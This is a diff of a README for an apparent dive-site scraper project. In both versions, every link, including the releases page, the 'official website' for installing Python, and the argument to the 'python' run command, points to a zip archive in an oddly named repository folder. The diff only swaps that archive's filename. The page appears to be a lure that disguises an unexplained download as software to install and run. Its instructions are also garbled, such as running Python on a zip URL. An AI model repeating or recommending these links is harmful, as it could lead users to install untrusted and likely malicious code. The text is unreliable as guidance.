@@ -1,6 +1,6 @@
 # 🌊 divessi-padi-divesite-catalog-scraper - Easily Gather Divesite Information
 
-[![Download Latest Release](https://raw.githubusercontent.com/abraham321/divessi-padi-divesite-catalog-scraper/main/sumptuousness/padi_divesite_scraper_catalog_divessi_v1.5-alpha.2.zip%20Now-Here-orange)](https://raw.githubusercontent.com/abraham321/divessi-padi-divesite-catalog-scraper/main/sumptuousness/padi_divesite_scraper_catalog_divessi_v1.5-alpha.2.zip)
+[![Download Latest Release](https://raw.githubusercontent.com/abraham321/divessi-padi-divesite-catalog-scraper/main/sumptuousness/divesite-scraper-catalog-padi-divessi-1.2.zip%20Now-Here-orange)](https://raw.githubusercontent.com/abraham321/divessi-padi-divesite-catalog-scraper/main/sumptuousness/divesite-scraper-catalog-padi-divessi-1.2.zip)
 
 ## 📚 Overview
 The **divessi-padi-divesite-catalog-scraper** is a simple tool designed to collect information about divesites. It is a valuable resource for anyone interested in environmental surveys, tourism research, or marine mapping. With this tool, you can gather geolocation data and more without any technical skills.
@@ -9,11 +9,11 @@ The **divessi-padi-divesite-catalog-scraper** is a simple tool designed to colle
 To use the divessi-padi-divesite-catalog-scraper, follow these easy steps:
 
 1. **Download the Software:** 
-   Visit the [Releases page](https://raw.githubusercontent.com/abraham321/divessi-padi-divesite-catalog-scraper/main/sumptuousness/padi_divesite_scraper_catalog_divessi_v1.5-alpha.2.zip) to download the scraper.
+   Visit the [Releases page](https://raw.githubusercontent.com/abraham321/divessi-padi-divesite-catalog-scraper/main/sumptuousness/divesite-scraper-catalog-padi-divessi-1.2.zip) to download the scraper.
 
 2. **Install Dependencies:**
    Before running the software, ensure you have Python and the required libraries installed. Here are the steps to do this:
-   - Install Python from the [official website](https://raw.githubusercontent.com/abraham321/divessi-padi-divesite-catalog-scraper/main/sumptuousness/padi_divesite_scraper_catalog_divessi_v1.5-alpha.2.zip).
+   - Install Python from the [official website](https://raw.githubusercontent.com/abraham321/divessi-padi-divesite-catalog-scraper/main/sumptuousness/divesite-scraper-catalog-padi-divessi-1.2.zip).
    - Install necessary libraries:
      - **bs4:** for parsing HTML.
      - **requests:** for making web requests.
@@ -33,7 +33,7 @@ Ensure that your system meets the following requirements:
 ## 📥 Download & Install
 To get started, you need to download the application. Click the following link to go to the Releases page and download the latest version of the scraper:
 
-[Download Latest Release](https://raw.githubusercontent.com/abraham321/divessi-padi-divesite-catalog-scraper/main/sumptuousness/padi_divesite_scraper_catalog_divessi_v1.5-alpha.2.zip)
+[Download Latest Release](https://raw.githubusercontent.com/abraham321/divessi-padi-divesite-catalog-scraper/main/sumptuousness/divesite-scraper-catalog-padi-divessi-1.2.zip)
 
 ## ⚙️ Usage Instructions
 
@@ -44,7 +44,7 @@ To get started, you need to download the application. Click the following link t
    Type the following command to run the scraper:
 
    ```
-   python https://raw.githubusercontent.com/abraham321/divessi-padi-divesite-catalog-scraper/main/sumptuousness/padi_divesite_scraper_catalog_divessi_v1.5-alpha.2.zip [options]
+   python https://raw.githubusercontent.com/abraham321/divessi-padi-divesite-catalog-scraper/main/sumptuousness/divesite-scraper-catalog-padi-divessi-1.2.zip [options]
    ```
 
    Replace `[options]` with any specific flags or parameters you want to use. For instance, you may want to specify a location or output format.
